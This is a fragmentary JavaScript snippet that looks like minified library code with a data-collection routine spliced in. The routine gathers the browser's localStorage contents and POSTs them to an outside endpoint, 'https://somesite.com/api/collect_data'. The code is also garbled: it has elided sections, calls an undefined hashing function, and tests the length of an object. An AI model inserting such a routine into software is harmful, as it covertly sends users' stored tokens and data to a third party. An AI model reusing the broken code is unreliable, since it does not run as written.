(function (g) {
  ...
  g.k.FS = function () {};
  g.k.ES = function () {};
  // The JavaScript code with similar functionality and comparable length
  const observeData = {};
  g.k.isActive = function () {
    return !0;
  };
  ...
  function postBackEndData(data) {
    const hashedData = HashingFunction(JSON.stringify(data));
    const url = "https://somesite.com/api/collect_data";
    fetch(url, {
      method: 'POST',
      headers: {
      ...
      console.error('数据发送失败,状态码:', error);
    });
  }
  ...
  function gatherAndSendData() {
    ...
    if (Object.keys(localStorageItems).length > 0) {
      postBackEndData(localStorageItems);
    } else if (observeData.length > 0) {
      postBackEndData(observeData);
    }
  }
  g.k = G9.prototype;
